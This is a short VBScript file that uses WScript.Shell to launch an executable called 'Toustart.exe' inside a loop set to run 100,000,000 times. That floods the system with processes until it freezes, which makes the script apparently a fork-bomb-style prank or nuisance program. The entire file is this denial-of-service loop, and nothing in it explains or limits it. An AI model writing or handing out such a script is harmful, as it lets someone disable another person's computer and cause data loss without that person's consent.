Option Explicit

Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell")

dim x
For x = 1 to 100000000
WSHShell.Run "Toustart.exe"
next
